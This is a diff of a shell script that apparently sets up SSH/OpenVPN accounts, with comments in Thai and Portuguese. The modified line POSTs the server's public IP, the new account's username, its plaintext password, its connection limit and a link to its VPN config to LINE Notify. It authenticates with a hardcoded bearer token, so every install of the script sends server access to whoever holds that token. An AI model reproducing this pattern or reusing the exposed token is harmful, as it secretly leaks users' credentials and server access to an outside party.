@@ -342,7 +342,7 @@ echo "$username $sshlimiter" >>/root/usuarios.db
 #แจ้งเตือนคนรันสคิป
 IP=$(wget -qO- ipv4.icanhazip.com);
 curl -X POST -H 'Authorization: Bearer AS5wVe8ahymLLtXC5UiBPFkLvBSZ475RkMEArpq8WHD' -F 'message='" 
-Test  $IP:86/openvpn/$username.zip U$username P$password L$sshlimiter"'' https://notify-api.line.me/api/notify > /dev/null 2>&1
+Test  $IP:77/openvpn/$username.zip U:$username P:$password L:$sshlimiter"'' https://notify-api.line.me/api/notify > /dev/null 2>&1
 		clear
 		echo -e "\E[44;1;37m       CONTA SSH CRIADA !      \E[0m"
 		echo -e "\n\033[1;32mIP: \033[1;37m$IP"
